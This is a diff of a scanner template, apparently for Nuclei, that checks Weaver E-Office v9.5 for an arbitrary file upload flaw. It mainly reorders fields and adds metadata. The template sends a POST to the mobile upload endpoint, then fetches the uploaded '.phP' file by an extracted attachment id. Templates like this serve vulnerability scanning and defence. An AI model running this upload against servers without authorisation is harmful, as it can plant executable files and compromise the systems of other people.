@@ -1,5 +1,4 @@
 id: weaver-eoffice-file-upload
-
 info:
   name: Weaver E-Office v9.5 - Arbitrary File Upload
   author: princechaddha
@@ -12,16 +11,32 @@ info:
     cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
+    fofa-query: app="泛微-EOffice"
     max-request: 2
+    product: e-office
     vendor: weaver
-  tags: e-office,weaver,intrusive,file-upload,vuln
-
+    verified: true
+  tags: e-office,file-upload,intrusive,vuln,weaver
 variables:
   filename: '{{rand_base(7, "abc")}}'
-
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: id
+        part: body
+        regex:
+          - \\\/attachment\\\/([0-9]+)\\\/
+        type: regex
+    host-redirects: true
+    matchers:
+      - part: body_2
+        type: word
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
+    max-redirects: 2
+    raw:
       - |
         POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
         Host: {{Hostname}}
@@ -42,23 +57,3 @@ http:
       - |
         GET /attachment/{{id}}/{{filename}}.phP HTTP/1.1
         Host: {{Hostname}}
-
-    host-redirects: true
-    max-redirects: 2
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - '{{randstr}}'
-
-    extractors:
-      - type: regex
-        name: id
-        part: body
-        group: 1
-        internal: true
-        regex:
-          - '\\\/attachment\\\/([0-9]+)\\\/'
-
